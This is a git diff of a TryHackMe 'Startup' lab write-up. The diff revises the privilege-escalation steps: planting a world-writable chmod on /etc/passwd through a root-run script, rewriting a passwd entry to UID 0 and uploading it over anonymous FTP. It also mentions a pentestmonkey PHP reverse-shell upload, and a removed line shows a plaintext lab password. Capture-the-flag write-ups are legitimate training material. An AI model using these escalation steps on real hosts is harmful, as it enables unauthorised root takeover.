@@ -56,8 +56,6 @@ no passwd
 
 cd ftp
 ftp> put
-(local-file) /home/kali/THM/Startup/Files/pentestmonkey.php
-(remote-file) pentestmonkey.php
 local: /home/kali/THM/Startup/Files/pentestmonkey.php remote: pentestmonkey.php
 ```
 That worked fine, and its shows up in the browser.
@@ -149,20 +147,43 @@ if we add
 ```
 cat /root/root.txt 
 ```
-we get the flag from root.txt, but if we add
+we get the flag from root.txt.<br>
 
+If we add this instead:
+```
+echo 'chmod ugo+rwx /etc/passwd' > /etc/print.sh
+```
+we will have full access to passwd.<br>
+Now we can give our self root access.
 ```
 cat /etc/passwd
-
-ändra till
-lennie:x:0:0::/home/lennie:/bin/bash
-
-skapa lokal fil som laddas upp med wget och kopieras till /etc/passwd
-
-cp /tmp/passwd /etc/passwd
-
-exit
-
-su lennie
-c4ntg3t3n0ughsp1c3
 ```
+Use cat output and make a new passwd on LHOST.
+```
+vi passwd 
+*change groupmembership
+lennie:x:0:0::/home/lennie:/bin/bash
+[esc] 
+:wq
+```
+This makes him member of root and gives him root access.<br>
+Upload the file to RHOST, copy to /etc/passwd.
+```
+ftp Anonymous@IPADRESS
+no passwd
+
+cd ftp
+ftp> put
+local: passwd remote: passwd
+cp /var/www/html/files/ftp/passwd /etc/passwd
+```
+### Login as root
+First you need to logout<br>
+And the login with root access
+```
+exit
+www-data@startup:/$ su lennie
+lennie
+Password: *********
+```
+### You are now root!
